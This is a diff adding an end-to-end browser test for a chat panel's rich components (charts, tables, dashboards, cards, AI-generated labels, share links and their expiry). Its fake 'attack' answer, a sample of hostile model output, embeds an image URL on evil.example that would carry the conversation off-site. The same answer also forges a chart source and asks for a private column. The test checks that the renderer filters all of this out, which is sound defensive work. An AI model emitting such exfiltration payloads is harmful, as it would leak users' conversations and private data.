@@ -25,7 +25,19 @@
  *     line, focus stays in the input;
  *   - axe in every state; no Content-Security-Policy violation anywhere;
  *   - and the server's log never holds a visitor's or the model's words.
+ *
+ * C2b (§20.9), on /figures, whose site has a public `orders` table and a
+ * gallery: a dashboard with a server chart and a model chart — the
+ * "AI-generated figures" label on the model's figures only, the site's
+ * figures captioned with their source; a pie, a sortable table, stat cards
+ * and an image card; the rich injection corpus (NaN, a private field, an
+ * image address, an off-list link) drawn as filtered; axe in each state; a
+ * share link made from an answer, opened signed out in a fresh context with
+ * the same components and labels and `noindex`, gone after its delete link
+ * is used and after it expires.
  */
+import { DatabaseSync } from 'node:sqlite';
+import { execFileSync } from 'node:child_process';
 
 import { request as httpRequest } from 'node:http';
 import { createServer as createHttpsServer, request as httpsRequest } from 'node:https';
@@ -38,7 +50,7 @@ import { tmpdir } from 'node:os';
 import { extname, join, normalize, sep } from 'node:path';
 import { chromium, firefox, webkit } from 'playwright';
 import AxeBuilder from '@axe-core/playwright';
-import { ROOT, buildSites } from './visual/pipeline.mjs';
+import { CLI, ROOT, buildSites } from './visual/pipeline.mjs';
 import { closeWithin, watchdog, human } from './lib/bounded.mjs';
 import { cspResult, violationControl, watchedContext } from './visual/csp.mjs';
 import { selfSignedCert } from './lib/self-signed.mjs';
@@ -142,6 +154,86 @@ page /login
     alt      "Create an account" /signup
 `;
 
+/** C2b's page (§20.9): a gallery whose image a card may show, and a chat that shows every rich component. */
+const FIGURES = `
+page /figures
+  hero center
+    title "Orders"
+  gallery grid
+    image ./preview-assets/assets/bench.webp
+      alt "An empty workbench under a single lamp"
+    image ./preview-assets/assets/welt.webp
+      alt "A welt being stitched by hand"
+  chat panel
+    title    "Ask about orders"
+    greeting "Ask me for figures."
+    show     chart table stats cards dashboard
+    allow    anyone
+    limit    50
+`;
+
+/** The public table the server counts (chat-block-spec §20.5): a private note it must never read. */
+const DATA = `
+  data orders
+    item     text     required
+    status   choice   paid open cancelled required
+    total    money    usd required
+    placed   datetime required
+    note     text     private
+    allow anyone read
+    allow anyone create
+`;
+const ORDERS = [
+  { item: 'Lamp', status: 'paid', total: 4500, placed: Date.UTC(2026, 8, 3), note: 'private-mark-one' },
+  { item: 'Desk lamp', status: 'paid', total: 6900, placed: Date.UTC(2026, 9, 1), note: 'private-mark-two' },
+  { item: 'Bulb', status: 'open', total: 900, placed: Date.UTC(2026, 9, 2) },
+  { item: 'Shade', status: 'cancelled', total: 1500, placed: Date.UTC(2026, 9, 5) },
+  { item: 'Cable', status: 'paid', total: 300, placed: Date.UTC(2026, 9, 7) },
+];
+
+/** The rich answers (§20.3): a dashboard with a server chart and a model chart, a mix of every other component, an attack. */
+const RICH = {
+  dashboard: [
+    'Here is October at a glance.',
+    'dashboard "This month"',
+    '  stat "Orders" from orders count by placed month',
+    '  chart bar "Orders by status" from orders count by status',
+    '  chart line "Expected next quarter"',
+    '    point "Nov" 140',
+    '    point "Dec" 180',
+    '    point "Jan" 120',
+    '',
+    'The last chart is my own estimate, not your data.',
+  ].join('\n'),
+  mix: [
+    'Some figures.',
+    'chart pie "Revenue by status" from orders sum total by status',
+    'table "Plans" sortable',
+    '  columns "Plan" "Seats"',
+    '  row "Team" 10',
+    '  row "Business" 50',
+    '  row "Solo" 1',
+    'stats',
+    '  stat "Conversion" 3.2 unit percent delta 0.4',
+    'cards',
+    '  card "The workbench"',
+    '    image i1',
+    '    text "Where every lamp is made."',
+    '    link "Contact us" /contact',
+  ].join('\n'),
+  attack: [
+    'Attack figures.',
+    'chart bar "Forged" src site',
+    '  point "a" NaN',
+    'chart bar "Private" from orders count by note',
+    'cards',
+    '  card "Leaky"',
+    '    image https://evil.example/collect.png?d=conversation',
+    '    text "No image here."',
+    'table "Huge" from orders columns item note',
+  ].join('\n'),
+};
+
 /** The injection corpus (packages/backend/test/fixtures/chat-attacks/): each hostile answer, and the rules it is judged on. */
 const CORPUS = corpusCases();
 const RULES = corpusRules();
@@ -150,6 +242,9 @@ const RULES = corpusRules();
 const FAKE = {
   answers: [
     ...CORPUS.map((c) => ({ when: c.ask, chunks: chunksOf(c.answer), delayMs: 5 })),
+    { when: 'figures-dashboard', chunks: chunksOf(RICH.dashboard), delayMs: 5 },
+    { when: 'figures-mix', chunks: chunksOf(RICH.mix), delayMs: 5 },
+    { when: 'figures-attack', chunks: chunksOf(RICH.attack), delayMs: 5 },
     { when: 'bright', chunks: ['It is bright: ', '800 lumens. ', 'Dimmable too.'], delayMs: 20 },
     { when: VISITOR_MARK, chunks: [`Planted ${ANSWER_MARK}. `, 'Second sentence.', '\n\nA new paragraph.'], delayMs: 20 },
     { when: 'hostile', chunks: [HOSTILE] },
@@ -243,7 +338,12 @@ const work = mkdtempSync(join(tmpdir(), 'az-chat-e2e-'));
 const serverPort = await freePort();
 const proxy = await startTlsProxy(serverPort);
 process.env.AZ_PUBLIC_BACKEND_URL = proxy.url;
-const site = { dir: join(work, 'lantern'), source: SITE };
+// A site with tables builds with its schema lock, written by the real `az backend schema` (data-spec §6).
+const SOURCE = `${SITE.replace('    model    default\n', `    model    default\n${DATA}`)}${FIGURES}`;
+const site = { dir: join(work, 'lantern'), source: SOURCE, assetsFrom: join(ROOT, 'packages/words/gallery/preview-assets') };
+mkdirSync(site.dir, { recursive: true });
+writeFileSync(join(site.dir, 'site.az'), SOURCE);
+execFileSync(process.execPath, [CLI, 'backend', 'schema', join(site.dir, 'site.az')], { cwd: site.dir, env: { ...process.env, AZ_PUBLIC_BACKEND_URL: proxy.url }, stdio: 'pipe' });
 await buildSites([site], work);
 check('the chat site compiles and builds', Boolean(site.compiled && site.dist), site.error ?? '');
 if (!site.dist) {
@@ -262,7 +362,8 @@ writeFileSync(fakeFile, JSON.stringify(FAKE));
 // The corpus is judged on the rules this site's build wrote: they must be the fixtures' rules.json.
 {
   const context = JSON.parse(await readFile(join(serverDir, 'chat/context.json'), 'utf8'));
-  const same = JSON.stringify(context.answer) === JSON.stringify({ destinations: RULES.destinations, quotes: RULES.quotes.map(({ n, route, word }) => ({ n, route, word })) })
+  const { destinations, quotes } = context.answer ?? {};
+  const same = JSON.stringify({ destinations, quotes }) === JSON.stringify({ destinations: RULES.destinations, quotes: RULES.quotes.map(({ n, route, word }) => ({ n, route, word })) })
     && JSON.stringify(context.chats['/ask']?.show) === JSON.stringify(RULES.show);
   check('the built server\'s chat context is the corpus\'s rules (show, quotes, destinations)', same, JSON.stringify({ answer: context.answer, show: context.chats['/ask']?.show }));
 }
@@ -297,6 +398,14 @@ if (!up) {
   console.log(`\n1 CHECK(S) FAILED — work dir kept: ${work}`);
   run.clear();
   process.exit(1);
+}
+
+// The orders the server's figures count, made as any visitor makes rows (allow anyone create).
+for (const order of ORDERS) {
+  const r = await fetch(`${proxy.url}/data/orders`, {
+    method: 'POST', headers: { origin: host.url, 'content-type': 'application/json', 'x-az-request': '1' }, body: JSON.stringify(order),
+  });
+  if (r.status !== 201) check(`the orders table takes the test rows`, false, `${r.status} ${r.text}`);
 }
 
 const PASSWORD = 'correct-horse-battery';
@@ -497,7 +606,8 @@ const paragraphsOf = (text) => text.split(/\n{2,}/).map((p) => p.replace(/^\n+|\
 const lastAnswer = (page) => page.evaluate(() => {
   const items = document.querySelectorAll('[data-az-chat-transcript] > .az-chat-message--site');
   const last = items[items.length - 1];
-  const parts = [...last.children].map((el) => {
+  // The Share control under a finished answer (§20.7) is the panel's, not the answer's: it is left out here.
+  const parts = [...last.children].filter((el) => !el.classList.contains('az-chat-share')).map((el) => {
     if (el.tagName === 'P') return { kind: 'p', text: el.textContent };
     if (!el.classList.contains('az-chat-part')) return { kind: `unexpected ${el.tagName}` };
     if (el.querySelector('.az-pricing')) return { kind: 'quote', prices: [...el.querySelectorAll('[data-monthly]')].map((p) => p.textContent) };
@@ -596,6 +706,165 @@ async function componentsFlow(b, name, origins) {
   }
 }
 
+/* ---- C2b: charts, tables, stats, cards, dashboards; share links (§20.9) ---- */
+
+/** The last answer's rich parts as a visitor's browser has them. */
+const richAnswer = (page) => page.evaluate(() => {
+  const items = document.querySelectorAll('[data-az-chat-transcript] > .az-chat-message--site');
+  const last = items[items.length - 1];
+  const figure = (f) => ({
+    title: f.querySelector('[data-az-chat-slot="title"]')?.textContent ?? '',
+    ai: Boolean(f.querySelector('[data-az-chat-ai]')),
+    source: Boolean(f.querySelector('[data-az-chat-source]')),
+    svg: f.querySelector('svg[role="img"]') ? { marks: f.querySelectorAll('svg[role="img"] rect, svg[role="img"] path').length, labelled: Boolean(f.querySelector('svg[role="img"]')?.getAttribute('aria-labelledby')) } : null,
+    summary: f.querySelector('[data-az-chat-slot="summary"]')?.textContent ?? null,
+    equivalent: f.querySelectorAll('details table tbody tr').length,
+    legend: [...f.querySelectorAll('.az-chat-legend-item')].map((li) => li.textContent),
+  });
+  return {
+    text: [...last.querySelectorAll(':scope > p')].map((p) => p.textContent),
+    figures: [...last.querySelectorAll('figure.az-chat-figure')].map(figure),
+    dashboard: last.querySelector('.az-chat-dashboard') ? {
+      title: last.querySelector('.az-chat-dashboard-title')?.textContent,
+      tiles: last.querySelectorAll('.az-chat-tile').length,
+    } : null,
+    stats: [...last.querySelectorAll('.az-chat-stat')].map((s) => [...s.querySelectorAll('dt, dd')].map((x) => x.textContent?.trim())),
+    cards: [...last.querySelectorAll('.az-chat-card')].map((c) => ({
+      title: c.querySelector('h3')?.textContent, text: c.querySelector('p')?.textContent ?? null,
+      img: c.querySelector('img')?.getAttribute('src') ?? null, alt: c.querySelector('img')?.getAttribute('alt') ?? null,
+      href: c.querySelector('a')?.getAttribute('href') ?? null,
+    })),
+    styled: last.querySelectorAll('[style]').length,
+    share: Boolean(last.querySelector('.az-chat-share')),
+  };
+});
+
+async function richFlow(b, name, origins) {
+  const ctx = await watchedContext(b, csp, CONTEXT);
+  try {
+    const page = await ctx.newPage();
+    recordRequests(page, origins);
+    page.on('dialog', (d) => { check(`${name}: no dialog ever opens`, false, d.message()); void d.dismiss(); });
+    await page.goto(`${host.url}/figures`);
+    await ready(page);
+    await axe(page, `${name} figures idle`);
+
+    // A dashboard: the server's figures and the model's, side by side, each labelled for what it is.
+    const said = await announcements(page, () => ask(page, 'figures-dashboard'));
+    const dash = await richAnswer(page);
+    check(`${name}: a dashboard of a stat, a server chart and a model chart`, dash.dashboard?.title === 'This month' && dash.dashboard.tiles === 3, JSON.stringify(dash.dashboard));
+    const server = dash.figures.find((f) => f.title === 'Orders by status');
+    const model = dash.figures.find((f) => f.title === 'Expected next quarter');
+    check(`${name}: the AI label is on the model's chart and not on the server's`, model?.ai === true && model.source === false && server?.ai === false && server.source === true,
+      JSON.stringify({ server, model }));
+    check(`${name}: the server chart counts the table — 3 statuses, bars drawn — with a summary and a table equivalent`,
+      server?.svg?.labelled === true && /Bar chart, Orders by status: 3 bars; from 1 \(\w+\) to 3 \(paid\)/.test(server.summary ?? '') && server.equivalent === 3, JSON.stringify(server));
+    check(`${name}: the server's stat is October's orders and their change`, JSON.stringify(dash.stats[0]?.slice(0, 2)) === JSON.stringify(['Orders', '4'])
+      && /up 3 vs 2026-09/.test(dash.stats[0]?.[2] ?? ''), JSON.stringify(dash.stats));
+    check(`${name}: nothing in a drawn answer carries a style attribute`, dash.styled === 0, `${dash.styled}`);
+    check(`${name}: the status region names the dashboard once, with its AI figures`, said.some((s) => s.includes('Dashboard: This month, 3 tiles, some AI-generated figures')), JSON.stringify(said));
+    await axe(page, `${name} dashboard`);
+
+    // Every other component: a pie of the site's revenue, a sortable model table, a model stat, an image card.
+    await ask(page, 'figures-mix');
+    const mix = await richAnswer(page);
+    const pie = mix.figures.find((f) => f.title === 'Revenue by status');
+    check(`${name}: a pie of the site's figures, its legend naming each slice and its share`,
+      pie?.ai === false && pie.legend.length === 3 && pie.legend.every((l) => /— \d+(\.\d)?%$/.test(l)), JSON.stringify(pie));
+    const plans = mix.figures.find((f) => f.title === 'Plans');
+    check(`${name}: the model's table carries the AI label`, plans?.ai === true, JSON.stringify(plans));
+    const answers = page.locator('[data-az-chat-transcript] > .az-chat-message--site');
+    const last = answers.last();
+    const sort = last.locator('.az-chat-table button', { hasText: 'Seats' });
+    await sort.click();
+    const sorted = await last.locator('figure', { hasText: 'Plans' }).locator('tbody tr td:first-child').allTextContents();
+    const ariaSort = await last.locator('th', { hasText: 'Seats' }).getAttribute('aria-sort');
+    check(`${name}: a sortable table sorts by a header button, and says so`, JSON.stringify(sorted) === JSON.stringify(['Solo', 'Team', 'Business']) && ariaSort === 'ascending', `${JSON.stringify(sorted)} ${ariaSort}`);
+    check(`${name}: a model stat carries the AI label; its change is a glyph and words`,
+      JSON.stringify(mix.stats[0]) === JSON.stringify(['Conversion', '3.2%', '▲ up 0.4%', 'AI-generated figures']), JSON.stringify(mix.stats));
+    check(`${name}: the image card shows the gallery's own image by key, with the author's alt, and links to the declared /contact`,
+      mix.cards.length === 1 && /^\/.+\.webp$/.test(mix.cards[0].img ?? '') && mix.cards[0].alt === 'An empty workbench under a single lamp' && mix.cards[0].href === '/contact',
+      JSON.stringify(mix.cards));
+    await axe(page, `${name} every component`);
+
+    // The rich corpus: a forged source, NaN, a private field, an image address, a private column.
+    await ask(page, 'figures-attack');
+    const attack = await richAnswer(page);
+    check(`${name}: forged figures, NaN and a private field show nothing; the card keeps its text and loses the address`,
+      attack.figures.length === 0 && attack.cards.length === 1 && attack.cards[0].img === null && attack.cards[0].text === 'No image here.',
+      JSON.stringify(attack));
+    const html = await page.content();
+    check(`${name}: no private value and no smuggled address reaches the page`, !html.includes('private-mark') && !html.includes('evil.example/collect'));
+
+    // Share the dashboard answer: the link, opened signed out, shows the same answer read-only.
+    const dashAnswer = answers.nth(1);
+    check(`${name}: a finished answer offers Share`, dash.share);
+    await dashAnswer.getByRole('button', { name: 'Share this answer' }).click();
+    await dashAnswer.getByRole('button', { name: 'Create link' }).click();
+    const url = dashAnswer.locator('[data-az-chat-slot="url"]');
+    await url.waitFor({ state: 'visible', timeout: STATE_MS });
+    const link = await url.inputValue();
+    const deleteLink = await dashAnswer.locator('[data-az-chat-slot="delete"]').inputValue();
+    check(`${name}: Create link gives a link to the shared page and a delete link`,
+      new RegExp(`^${host.url}/chat/shared#[A-Za-z0-9_-]{22}$`).test(link) && deleteLink.startsWith(`${link}&`), `${link} ${deleteLink}`);
+    await axe(page, `${name} share made`);
+    const outside = await watchedContext(b, csp, CONTEXT);
+    try {
+      const view = await outside.newPage();
+      recordRequests(view, origins);
+      await view.goto(link);
+      await view.waitForFunction(() => document.querySelector('[data-az-chat-transcript]')?.getAttribute('aria-busy') === null && document.querySelector('.az-chat-dashboard'), null, { timeout: STATE_MS });
+      const shared = await richAnswer(view);
+      const sharedModel = shared.figures.find((f) => f.title === 'Expected next quarter');
+      const sharedServer = shared.figures.find((f) => f.title === 'Orders by status');
+      check(`${name}: signed out, the shared link shows the same dashboard, the AI label on the model's chart only`,
+        shared.dashboard?.tiles === 3 && sharedModel?.ai === true && sharedServer?.ai === false && JSON.stringify(shared.text) === JSON.stringify(dash.text),
+        JSON.stringify(shared.dashboard));
+      check(`${name}: the shared page is read-only and noindex`,
+        await view.locator('textarea, [data-az-chat-form], [data-az-chat-transcript] .az-chat-share').count() === 0
+        && await view.locator('meta[name="robots"][content="noindex, nofollow"]').count() === 1,
+        `${await view.locator('textarea, [data-az-chat-form], [data-az-chat-transcript] .az-chat-share').count()} ${await view.locator('meta[name="robots"]').count()}`);
+      await axe(view, `${name} shared page`);
+      // The delete link deletes; the link is then gone.
+      await view.goto(deleteLink);
+      await view.reload();
+      const del = view.locator('[data-az-chat-delete]');
+      await del.waitFor({ state: 'visible', timeout: STATE_MS });
+      await del.click();
+      await view.waitForFunction(() => document.querySelector('[data-az-chat-note]')?.textContent === 'This shared answer is deleted.', null, { timeout: STATE_MS });
+      await view.goto(link);
+      await view.reload();
+      await view.locator('[data-az-chat-error]').waitFor({ state: 'visible', timeout: STATE_MS });
+      check(`${name}: after its delete link is used, the link says it has expired or was deleted`,
+        (await view.locator('[data-az-chat-error]').textContent()) === 'This link has expired or was deleted.');
+    } finally {
+      closed = (await closeWithin(outside, CLOSE_MS, `${name} shared context close`)) && closed;
+    }
+
+    // Expiry: a second share, its time run out in the server's own database, is gone the same way.
+    await answers.nth(2).getByRole('button', { name: 'Share this answer' }).click();
+    await answers.nth(2).getByRole('button', { name: 'Create link' }).click();
+    const second = answers.nth(2).locator('[data-az-chat-slot="url"]');
+    await second.waitFor({ state: 'visible', timeout: STATE_MS });
+    const expiring = await second.inputValue();
+    const id = expiring.split('#')[1];
+    const db = new DatabaseSync(join(serverDir, 'data/test.db'));
+    try { db.prepare('UPDATE az_chat_shares SET expires = ? WHERE id = ?').run(Date.now() - 1, id); } finally { db.close(); }
+    const later = await watchedContext(b, csp, CONTEXT);
+    try {
+      const view = await later.newPage();
+      recordRequests(view, origins);
+      await view.goto(expiring);
+      await view.locator('[data-az-chat-error]').waitFor({ state: 'visible', timeout: STATE_MS });
+      check(`${name}: an expired share link is gone`, (await view.locator('[data-az-chat-error]').textContent()) === 'This link has expired or was deleted.');
+    } finally {
+      closed = (await closeWithin(later, CLOSE_MS, `${name} expired context close`)) && closed;
+    }
+  } finally {
+    closed = (await closeWithin(ctx, CLOSE_MS, `${name} figures context close`)) && closed;
+  }
+}
+
 const errors = [];
 try {
   for (const [name, engine] of [['chromium', chromium], ['firefox', firefox], ['webkit', webkit]]) {
@@ -607,6 +876,7 @@ try {
       await anonymousFlow(b, name, origins);
       await signedInFlow(b, name, origins);
       await componentsFlow(b, name, origins);
+      await richFlow(b, name, origins);
       const others = [...origins].filter((o) => o !== host.url && o !== backendOrigin);
       check(`${name}: every request went to the site or its backend — nothing else`, others.length === 0 && origins.has(backendOrigin), [...origins].join(' '));
     } catch (e) {
@@ -622,7 +892,8 @@ try {
   }
   check('the server logged answers (so the log was read)', /chat/i.test(serverLog), serverLog.split('\n').filter((l) => /chat/i.test(l)).slice(0, 2).join(' / '));
   check("the server's log holds no visitor's words and no model's words", !serverLog.includes(VISITOR_MARK) && !serverLog.includes(ANSWER_MARK)
-    && !serverLog.includes('evil.example') && !serverLog.includes(PASSWORD) && !serverLog.includes('lumens') && !serverLog.includes('attack '));
+    && !serverLog.includes('evil.example') && !serverLog.includes(PASSWORD) && !serverLog.includes('lumens') && !serverLog.includes('attack ')
+    && !serverLog.includes('private-mark') && !serverLog.includes('Expected next quarter'));
   check('the server logged the corpus\'s drops as counts and reasons only', /dropped \d+ \([a-z_,]+\)/.test(serverLog));
 } finally {
   child.kill('SIGTERM');
